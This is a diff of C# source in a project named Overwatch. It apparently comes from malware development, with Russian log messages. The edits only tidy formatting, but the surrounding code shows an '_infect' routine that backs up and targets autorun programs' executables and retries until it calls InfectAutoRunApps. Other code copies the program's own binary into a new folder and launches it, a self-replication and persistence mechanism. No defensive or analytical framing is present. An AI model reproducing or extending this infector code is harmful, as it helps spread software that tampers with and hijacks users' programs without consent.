@@ -96,7 +96,6 @@ namespace Overwatch
         private static void _infect(AutorunProgram targetProgram)
         {
             File.Copy(targetProgram.RunFilePath, targetProgram.RunFilePath + ".bak", true);
-
             int count_try = 0;
             retry:
             if (targetProgram.IsActiveProcess)
@@ -115,15 +114,10 @@ namespace Overwatch
             {
                 Thread.Sleep(1000);
                 count_try++;
-
                 if (count_try >= 5)
-                {
                     InfectAutoRunApps();
-                }
                 else
-                {
                     goto retry;
-                }
             }
         }
 
@@ -138,7 +132,6 @@ namespace Overwatch
             if (!di.Exists)
             {
                 di.Create();
-
                 Log.Write($"Папка {di.FullName} успешно создана.", true);
             }
             else
@@ -156,7 +149,6 @@ namespace Overwatch
                 if (!cProcesses.IsFileActiveProcess(fi.FullName))
                 {
                     Process.Start(fi.FullName);
-
                     Log.Write($"Копия приложения в {fi.FullName} - была запущена.");
                 }
                 else
@@ -166,7 +158,6 @@ namespace Overwatch
             {
                 File.Copy(appConfing.MyFullPath, fi.FullName, true);
                 Process.Start(fi.FullName);
-
                 Log.Write($"Копия приложения в {fi.FullName} - была создана и запущена.", true);
             }
         }
